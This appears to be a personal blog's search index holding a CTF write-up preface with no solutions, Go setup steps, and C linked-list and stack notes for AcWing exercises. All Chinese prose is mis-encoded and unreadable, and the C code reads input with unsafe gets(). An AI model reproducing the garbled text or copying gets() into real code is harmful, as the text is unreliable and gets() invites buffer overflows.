<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TSCTF-J 2024-WriteUp</title>
      <link href="/2024/09/tsctfwp/"/>
      <url>/2024/09/tsctfwp/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>æœ¬æ¥ä¸å¤ªæƒ³å‚åŠ ï¼Œæ¯•ç«Ÿå‰å‡ å¹´éƒ½æ˜¯è¢«æ–°ç”Ÿèµ›æš´æ‰“ï¼Œå·²ç»è¢«æ‰“å¾—æ²¡è„¾æ°”äº†ã€‚å‰å‡ å¤©zyé¸½é¸½çªç„¶è¯´è¦æ‰“ï¼Œå°±æŠ±ç€å½“é™ªç»ƒçš„å¿ƒæ€å‚åŠ äº†ï¼Œç»“æœæ„å¤–åœ°æ‹¿äº†ç¬¬4ï¼ˆzyé¸½é¸½ç¬¬3,è¿˜æ˜¯ç¬¬ä¸€æ¬¡æ‰“å‘¨å¤§ç¦ï¼Œå®åœ¨æ˜¯tqlï¼Œorz orzï¼‰ã€‚zyé¸½é¸½è¿™æ¬¡æ¯”èµ›å‡ ä¹aç©¿äº†webçš„é¢˜ï¼ˆé™¤äº†zbrè¿™ä¸ªbå‡ºçš„é¢˜ï¼‰ï¼Œå®åœ¨ğŸ®æ³¢ä¸€ï¼ˆè€Œæˆ‘åªèƒ½å†™ä¸¤é“webç­¾åˆ°ï¼Œä»¤äººæ„Ÿæ…¨ï¼‰ã€‚åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ä¹Ÿå­¦äº†ä¸€ç‚¹ä¸œè¥¿ï¼ˆä½†ä¸å¤šï¼Œå¤§å¤šæ•°æ—¶é—´éƒ½æ˜¯åœ¨åç‰¢ï¼Œå°‘éƒ¨åˆ†æ—¶é—´åœ¨å¤ä¹ å·²ç»ä¼šçš„ä¸œè¥¿ï¼‰ï¼Œå°±è®°å½•ä¸€ä¸‹å§ã€‚è¿™ç¯‡wpä¸­æ•´åˆäº†æˆ‘è·Ÿzyé¸½é¸½çš„wpï¼Œåç»­å¦‚æœå‡ºå®˜è§£ä¹Ÿä¼šæ”¾è¿›æ¥ã€‚</p><h2 id="è¯„ä»·">è¯„ä»·</h2><p>ä½ é‚®æ–°ç”Ÿèµ›ä¸€å‘ä»¥éš¾åº¦é€†å¤©è‘—ç§°ï¼ˆå¤§ä¸€é‚£ä¸€å¹´çš„æ–°ç”Ÿèµ›éš¾åº¦è¿˜æ¯”è¾ƒæ­£å¸¸ï¼Œå¯æƒœå½“æ—¶æˆ‘å¤ªèœäº†ï¼Œåæ¥æ¯ä¸€å¹´éƒ½å¾ˆé€†å¤©ï¼Œè‡³å°‘ä¸å¤ªåƒç»™æ–°ç”Ÿåšçš„ï¼‰ã€‚ä»Šå¹´ä¾æ—§å¾ˆé€†å¤©ï¼ˆå¾ˆå¤šç ”å“¥éƒ½åšä¸å‡ºæ¥ä¸¤é“ï¼Œæ¯”å¦‚æˆ‘å®¤å‹ï¼‰ã€‚ç›¸æ¯”è¾ƒè€Œè¨€ï¼Œmoectfå°±å¯¹æ–°ç”Ÿå¾ˆå‹å¥½ï¼Œå¸Œæœ›è€æ¯•ç™»ä»¬è€—å­å°¾æ±ï¼Œå¥½å¥½åæ€ï¼ˆé€ƒï¼‰ã€‚</p><h2 id="åè®°">åè®°</h2><p>ç‰›é­”çš„xdï¼Œçº¯çº¯çš„csã€‚ä¸€æ•´ä¸ªå‘¨æœ«å…¨å»åç‰¢å»äº†ï¼Œpéƒ½æ²¡å¹²ã€‚æ¯«æ— æ„å¤–ï¼Œå‘¨ä¸€ç»„ä¼šè¢«xdè–„çº±äº†ã€‚å°±æ˜¯ä¸çŸ¥é“xdè€æƒ¦è®°ä»–é‚£bæ·±åº¦å¼ºåŒ–å­¦ä¹ å¹²ä»€ä¹ˆç©æ„ã€‚<br>ä¸è¿‡ç ´ä¸‡æ³•é‚£é“é¢˜ç¡®å®å¡äº†å¤ªä¹…äº†ï¼Œæ²¡æƒ³åˆ°æœ€åå€’åœ¨å°å°çš„recvä¸Šï¼Œä¸ç„¶æˆ‘å¯ä»¥é«˜é«˜å…´å…´åœ°å»åšé¡¹ç›®ï¼ˆtouching fishï¼‰ã€‚åªæƒ³è¯´ä¸€å¥æˆ‘pwnä½ ğŸã€‚é™„pwnå‡ºé¢˜äººåœ¨wpç»“å°¾çš„åæ§½<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-26%20011956.png" alt="å®˜æ–¹åæ§½ï¼Œæœ€ä¸ºè‡´å‘½"><br>è¿˜æœ‰çœ‹å®Œå®˜è§£ä»¥åï¼Œæˆ‘åªæƒ³ç”¨ä¸€å¥è¯è¡¨è¾¾æˆ‘å¯¹ctfçš„çƒ­çˆ±ï¼Œæˆ‘c(**)ä¼¼t(a)çš„f(ather)</p>]]></content>
      
      
      <categories>
          
          <category> sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Goè¯­è¨€åŸºç¡€</title>
      <link href="/2023/07/ez-golang/"/>
      <url>/2023/07/ez-golang/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2><h3 id="Linux">Linux</h3><p>å®˜ç½‘ä¸‹è½½å®‰è£…åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pkg.go.dev/cmd/go</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨wslæ¼”ç¤º<br>å°†å®‰è£…åŒ…è§£å‹åˆ°<code>/usr/local</code>ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -C /usr/local -xzf go1.20.6.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹<code>~/.bashrc</code>æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure><p>é‡æ–°åŠ è½½æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹Goç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure><h3 id="Windows">Windows</h3><p>åç»­å†è¡¥</p><h3 id="ç¼–è¾‘å™¨">ç¼–è¾‘å™¨</h3><p>Goland or VS code</p><h2 id="åŸºæœ¬è¯­æ³•">åŸºæœ¬è¯­æ³•</h2>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>algo_learn_1</title>
      <link href="/2023/07/algo-learn-1/"/>
      <url>/2023/07/algo-learn-1/</url>
      
        <content type="html"><![CDATA[<p>å¹¶éåˆç†çš„å®ç°ï¼Œåªæ˜¯æ–¹ä¾¿é€šè¿‡ç¬”è¯•</p><h2 id="ä¸€ã€å•é“¾è¡¨">ä¸€ã€å•é“¾è¡¨</h2><p>å®šä¹‰ç•¥<br>æ“ä½œä»£ç <br>åšé¢˜çš„æ—¶å€™ç»å¸¸æ‹¿æ•°ç»„æ¨¡æ‹Ÿé“¾è¡¨ï¼ˆé˜²æ­¢è¶…æ—¶ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e[N]å­˜å‚¨å€¼ï¼Œne[N]å­˜å‚¨å¯¹åº”ç´¢å¼•çš„èŠ‚ç‚¹ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„ç´¢å¼•</span></span><br><span class="line"><span class="comment">// idxæŒ‡å½“å‰æ“ä½œçš„æ•°ç»„ç´¢å¼•ï¼Œheadä¸ºå¤´èŠ‚ç‚¹,å³å¤„äºé“¾è¡¨å¤´éƒ¨çš„èŠ‚ç‚¹ç´¢å¼•</span></span><br><span class="line"><span class="type">int</span> e[N], ne[N], idx, head;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">head = <span class="number">-1</span>;<span class="comment">// -1è¡¨ç¤ºæŒ‡å‘ç©º</span></span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’å…¥å¤´èŠ‚ç‚¹</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert_head</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head;</span><br><span class="line">    head = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’å…¥ç´¢å¼•ä¸ºkçš„èŠ‚ç‚¹ä¹‹å</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">e[idx] = x;</span><br><span class="line">ne[idx] = ne[k<span class="number">-1</span>];</span><br><span class="line">ne[k<span class="number">-1</span>] = idx;</span><br><span class="line">idx ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ é™¤ç´¢å¼•ä¸ºkåé¢çš„èŠ‚ç‚¹</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">ne[k<span class="number">-1</span>] = ne[ne[k<span class="number">-1</span>]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing826æ›´é€‚åˆç”¨æ•°ç»„æ¨¡æ‹Ÿé“¾è¡¨ï¼Œå› ä¸ºé¢˜ç›®è¦æ±‚çš„æ’å…¥æ“ä½œéƒ½æ˜¯å¯¹ç¬¬kä¸ªæ’å…¥çš„æ•°æ’å…¥ã€‚ä½¿ç”¨æ™®é€šçš„é“¾è¡¨æ‰¾ä¸åˆ°æ’å…¥çš„é¡ºåºå…³ç³»<br><a href="https://www.acwing.com/problem/content/828/">åŸæ–‡é“¾æ¥</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> e[N], ne[N], idx, head;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">head = <span class="number">-1</span>;<span class="comment">// -1è¡¨ç¤ºæŒ‡å‘ç©º</span></span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’å…¥å¤´èŠ‚ç‚¹</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert_head</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head;</span><br><span class="line">    head = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’å…¥ç´¢å¼•ä¸ºkçš„èŠ‚ç‚¹ä¹‹å</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">e[idx] = x;</span><br><span class="line">ne[idx] = ne[k<span class="number">-1</span>];</span><br><span class="line">ne[k<span class="number">-1</span>] = idx;</span><br><span class="line">idx ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ é™¤ç´¢å¼•ä¸ºkåé¢çš„èŠ‚ç‚¹</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">ne[k<span class="number">-1</span>] = ne[ne[k<span class="number">-1</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        gets(a);</span><br><span class="line">        <span class="type">int</span> x, k;</span><br><span class="line">        <span class="comment">// printf(&quot;%s\n&quot;, a);</span></span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>] == <span class="string">&#x27;H&#x27;</span>)&#123;</span><br><span class="line">            x = atoi(a + <span class="number">2</span>);</span><br><span class="line">            insert_head(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[<span class="number">0</span>] == <span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">            k = atoi(a + <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">0</span>) &#123;head = ne[head];&#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;remove_node(k);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            k = atoi(a + <span class="number">2</span>);</span><br><span class="line">            <span class="type">int</span> i = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;<span class="keyword">while</span>(a[i]!=<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            x = atoi(a+i+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// printf(&quot;%d&quot;,x);</span></span><br><span class="line">            insert(k, x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = head;</span><br><span class="line">    <span class="keyword">while</span>(i != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">        i = ne[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒã€åŒé“¾è¡¨">äºŒã€åŒé“¾è¡¨</h2><p>ç‰¹ç‚¹ï¼šé“¾è¡¨ä¸­æ¯ä¸€ä¸ªå…ƒç´ å‡æŒ‡å‘å‰ä¸€èŠ‚ç‚¹å’Œåä¸€èŠ‚ç‚¹<br>æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   e[N]ä¸ºå…ƒç´ å€¼</span></span><br><span class="line"><span class="comment">   f[N]ä¸ºå‰å‘æŒ‡é’ˆæ•°ç»„ï¼Œå€¼ä¸ºå‰ä¸€å…ƒç´ çš„ç´¢å¼•ï¼Œb[N]ä¸ºåå‘æŒ‡é’ˆï¼ŒæŒ‡å‘åä¸€å…ƒç´ ç´¢å¼•</span></span><br><span class="line"><span class="comment">   å‡å®šæ’ä¸ºå¤´èŠ‚ç‚¹ç´¢å¼•ä¸º0ï¼Œå°¾èŠ‚ç‚¹ç´¢å¼•æ’ä¸º1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> e[N], f[N], b[N];</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// å°¾èŠ‚ç‚¹æ— åå‘</span></span><br><span class="line">    b[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    f[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// å¤´èŠ‚ç‚¹æ— å‰å‘</span></span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åœ¨kå·¦ä¾§æ’å…¥</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">front_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    f[idx] = f[k];</span><br><span class="line">    b[idx] = k;</span><br><span class="line">    b[f[k]] = idx;</span><br><span class="line">    f[k] = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åœ¨kå³ä¾§æ’å…¥ï¼Œç­‰ä»·äºåœ¨b[k]çš„å·¦ä¾§æ’å…¥</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">back_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(b[k], x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’å…¥å¤´èŠ‚ç‚¹ä¹‹åï¼Œç­‰ä»·äºåœ¨å¤´èŠ‚ç‚¹å³ä¾§æ’å…¥</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">head_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    back_insert(<span class="number">0</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’å…¥å°¾èŠ‚ç‚¹ä¹‹å‰ï¼Œç­‰ä»·äºåœ¨ä¸ºèŠ‚ç‚¹åšå‡ºæ’å…¥</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tail_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(<span class="number">1</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    b[f[k]] = b[k];</span><br><span class="line">    f[b[k]] = f[k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing 827åŒé“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> e[N], f[N], b[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// å°¾èŠ‚ç‚¹æ— åå‘</span></span><br><span class="line">    b[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    f[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// å¤´èŠ‚ç‚¹æ— å‰å‘</span></span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åœ¨kå·¦ä¾§æ’å…¥</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">front_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    f[idx] = f[k];</span><br><span class="line">    b[idx] = k;</span><br><span class="line">    b[f[k]] = idx;</span><br><span class="line">    f[k] = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åœ¨kå³ä¾§æ’å…¥ï¼Œç­‰ä»·äºåœ¨b[k]çš„å·¦ä¾§æ’å…¥</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">back_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(b[k], x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’å…¥å¤´èŠ‚ç‚¹ä¹‹åï¼Œç­‰ä»·äºåœ¨å¤´èŠ‚ç‚¹å³ä¾§æ’å…¥</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">head_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    back_insert(<span class="number">0</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’å…¥å°¾èŠ‚ç‚¹ä¹‹å‰ï¼Œç­‰ä»·äºåœ¨ä¸ºèŠ‚ç‚¹åšå‡ºæ’å…¥</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tail_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(<span class="number">1</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    b[f[k]] = b[k];</span><br><span class="line">    f[b[k]] = f[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> x, k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;= n - <span class="number">1</span>;i++)&#123;</span><br><span class="line">        gets(a);</span><br><span class="line">        <span class="keyword">switch</span>(a[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">               x = atoi(a + <span class="number">2</span>);</span><br><span class="line">               head_insert(x);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">                x = atoi(a + <span class="number">2</span>);</span><br><span class="line">                tail_insert(x);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                k = atoi(a + <span class="number">2</span>);</span><br><span class="line">                delete_node(k + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                </span><br><span class="line">                k = atoi(a + <span class="number">3</span>);</span><br><span class="line">                <span class="type">int</span> i = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">while</span>(a[i]!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                x = atoi(a + i + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(a[<span class="number">1</span>] == <span class="string">&#x27;L&#x27;</span>) front_insert(k+<span class="number">1</span>, x);</span><br><span class="line">                <span class="keyword">else</span> back_insert(k+<span class="number">1</span>, x);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = b[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span>(i != <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">        i = b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€æ ˆ">ä¸‰ã€æ ˆ</h2><p>ç‰¹ç‚¹ï¼šå…ˆè¿›åå‡º<br>æ•°ç»„å®ç°æ ˆï¼Œæ­¤å¤„æ ˆå¼€çš„è¶³å¤Ÿå¤§ï¼Œä¸è€ƒè™‘æº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span 